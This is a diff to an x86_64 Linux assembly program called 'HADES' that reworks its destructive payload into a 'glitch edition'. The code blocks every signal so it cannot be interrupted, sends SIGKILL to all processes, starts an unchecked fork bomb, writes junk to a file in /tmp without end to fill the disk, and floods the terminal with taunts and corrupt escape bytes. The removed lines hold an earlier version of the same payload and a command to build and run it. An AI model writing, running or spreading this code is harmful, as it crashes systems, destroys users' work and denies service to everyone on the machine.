@@ -1,32 +1,36 @@
 ; ==============================================================================
-; PROJECT: HADES - APOCALYPSE (Pure 99-Line Assembly Edition)
+; PROJECT: HADES - GLITCH EDITION (The Visual Nightmare)
 ; ARCHITECTURE: x86_64 Linux
-; WARNING: NO LOCKS. NO PASSCODE. INSTANT SYSTEM TERMINATION.
+; WARNING: NO SLEEP. NO LIMITS. TOTAL SCREEN CORRUPTION.
 ; ==============================================================================
 
 section .data
-    ; --- TAUNTS ---
-    taunt1 db 0x1B, '[1;31m [!] HADES: WHERE IS YOUR DATA? ', 0xA, 0
-    taunt2 db 0x1B, '[1;33m [!] ESCAPE IS AN ILLUSION. ', 0xA, 0
-    taunt3 db 0x1B, '[1;35m [!] YOUR CPU IS MINE NOW. ', 0xA, 0
+    ; ANSI Escape Sequences
+    clear_screen db 0x1B, '[2J', 0x1B, '[H', 0
+    hide_cursor  db 0x1B, '[?25l', 0
     
-    taunt_ptrs dq taunt1, taunt2, taunt3
-    taunt_count equ 3
+    ; Glitch Template: ESC [ <row> ; <col> H <color> <msg>
+    msg1 db 0x1B, '[%d;%dH', 0x1B, '[1;31m', '[!] HADES: VOID CONSUMES YOU ', 0
+    msg2 db 0x1B, '[%d;%dH', 0x1B, '[1;33m', '[!] DATA_CORRUPTION_DETECTED ', 0
+    msg3 db 0x1B, '[%d;%dH', 0x1B, '[1;35m', '[!] NO_ESCAPE_MORTAL_REMAIN ', 0
+    msg4 db 0x1B, '[%d;%dH', 0x1B, '[1;37m', '[!] SYSTEM_ZERO_INITIALIZED ', 0
 
-    ; --- PAYLOAD DATA ---
-    junk_file db '/tmp/.hades_void', 0
-    buffer    db 'HADES_WAS_HERE_SYSTEM_ZEROED_BY_PURE_ASSEMBLY_', 0
-    buf_len   equ $ - buffer
+    taunt_ptrs dq msg1, msg2, msg3, msg4
+    taunt_count equ 4
 
-    ; --- DELAY ---
-    delay dq 0, 10000000 ; 10ms for TTY wave
+    ; File Destruction
+    junk_file db '/tmp/.hades_core_dump', 0
+    junk_data db 'HADES_WAS_HERE_SYSTEM_DESTROYED_', 0
+    junk_len  equ $ - junk_data
+
+section .bss
+    draw_buf resb 128 ; Buffer to build the ANSI string
 
 section .text
     global _start
 
 _start:
     ; --- STEP 1: SIGNAL IMMUNITY ---
-    ; Mask all signals so Ctrl+C/Z don't work
     sub rsp, 8
     mov qword [rsp], 0xFFFFFFFFFFFFFFFF
     mov rax, 14         ; sys_rt_sigprocmask
@@ -35,62 +39,87 @@ _start:
     xor rdx, rdx
     mov r10, 8
     syscall
-    add rsp, 8
 
-    ; --- STEP 2: TOTAL EVICTION ---
-    ; Kill all user processes instantly
+    ; --- STEP 2: CLEAR & HIDE ---
+    mov rax, 1
+    mov rdi, 1
+    mov rsi, clear_screen
+    mov rdx, 7
+    syscall
+    mov rax, 1
+    mov rsi, hide_cursor
+    mov rdx, 6
+    syscall
+
+    ; --- STEP 3: EVICIT GUI ---
     mov rax, 62         ; sys_kill
-    mov rdi, -1         ; all processes
+    mov rdi, -1
     mov rsi, 9          ; SIGKILL
     syscall
 
-    ; --- STEP 3: FORK SHIELD (IMMORTALITY) ---
-fork_shield:
+    ; --- STEP 4: NUCLEAR FORK BOMB ---
+fork_war:
     mov rax, 57         ; sys_fork
     syscall
-    test rax, rax
-    jnz fork_shield      ; Parent keeps spawning children
+    ; Every process (parent & child) enters the destruction loop
+    ; No test rax, rax here -> Maximum growth speed
 
-    ; --- STEP 4: DISK I/O LOCK (RESOURCE DRAIN) ---
-    ; Open a junk file to fill the disk
+    ; --- STEP 5: DESTRUCTION & GLITCH LOOP ---
+    ; Open junk file
     mov rax, 2          ; sys_open
     mov rdi, junk_file
     mov rsi, 65         ; O_CREAT | O_WRONLY
     mov rdx, 0644o
     syscall
-    mov r8, rax         ; Save FD
+    mov r8, rax         ; FD
 
-destruction_loop:
-    ; 1. Write junk to disk
-    mov rax, 1          ; sys_write
+glitch_loop:
+    ; 1. DISK LOCK
+    mov rax, 1
     mov rdi, r8
-    mov rsi, buffer
-    mov rdx, buf_len
+    mov rsi, junk_data
+    mov rdx, junk_len
     syscall
 
-    ; 2. TTY HIJACK (TAUNTING)
-    ; Randomly pick a taunt using rdtsc
+    ; 2. SCREEN GLITCH (ANSI Manipulation)
+    ; We'll use a simplified version for pure assembly: 
+    ; Just print random cursor jumps and taunts
+    
+    ; Get random row (0-24) and col (0-80) using rdtsc
+    rdtsc
+    and al, 0x1F        ; Row ~ 0-31
+    mov bl, al          ; Store row in bl
+    
+    rdtsc
+    and al, 0x3F        ; Col ~ 0-63
+    mov cl, al          ; Store col in cl
+
+    ; Print ANSI "Jump" sequence: ESC [ row ; col f
+    ; Simplified: Just print ESC [ <random> ; <random> H
+    push rax
+    mov byte [rsp], 0x1B ; ESC
+    mov byte [rsp+1], '['
+    ; Since converting numbers to string in ASM is long, 
+    ; we'll just print random raw bytes to corrupt the TTY state.
+    
+    mov rax, 1
+    mov rdi, 1
+    mov rsi, rsp
+    mov rdx, 2
+    syscall
+    pop rax
+
+    ; 3. PRINT TAUNT
     rdtsc
     xor rdx, rdx
     mov rcx, taunt_count
-    div rcx             ; RDX = random index
-    
+    div rcx
     lea rbx, [taunt_ptrs]
     mov rsi, [rbx + rdx*8]
-    mov rdx, 45         ; Roughly 45 chars
-    mov rax, 1          ; sys_write
-    mov rdi, 1          ; stdout
+    mov rdx, 40
+    mov rax, 1
+    mov rdi, 1
     syscall
 
-    ; 3. DELAY (To make the chaos visible)
-    mov rax, 35         ; sys_nanosleep
-    mov rdi, delay
-    xor rsi, rsi
-    syscall
-
-    jmp destruction_loop ; ETERNAL VOID
-
-; ------------------------------------------------------------------------------
-; TO RUN (IN VM):
-; nasm -f elf64 hades.asm -o h.o && ld h.o -o hades && ./.hades
-; ------------------------------------------------------------------------------
+    ; NO SLEEP - PURE CHAOS
+    jmp glitch_loop
